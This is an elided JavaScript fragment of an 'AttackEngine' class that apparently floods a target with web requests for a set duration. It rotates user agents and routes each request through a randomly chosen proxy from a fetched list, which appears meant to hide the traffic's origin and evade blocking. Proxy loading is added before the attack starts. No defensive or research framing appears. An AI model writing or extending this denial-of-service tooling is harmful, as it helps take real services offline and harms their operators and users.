...
class AttackEngine {  
    constructor(target, duration) {  
        ...
        this.uaIndex = 0;  
        this.running = true;  
        this.proxies = []; // Add a proxies array to store the fetched proxies
    }  

    async loadProxies() {
        this.proxies = await getProxies(); // Fetch the proxies at the start
    }
    ...
    getRandomProxy() {
        ...
        return { host, port: parseInt(port) }; // Assuming proxy format "ip:port"
    }
    ...
    async makeRequest() {  
        ...
        const proxy = this.getRandomProxy(); // Get a random proxy
        ...
        // If proxy is available, use it in the request config
        if (proxy) {
            requestConfig.proxy = {
                host: proxy.host,
                port: proxy.port
    ...
    async runAttack() {  
        ...
        await this.loadProxies(); // Load proxies before starting the attack
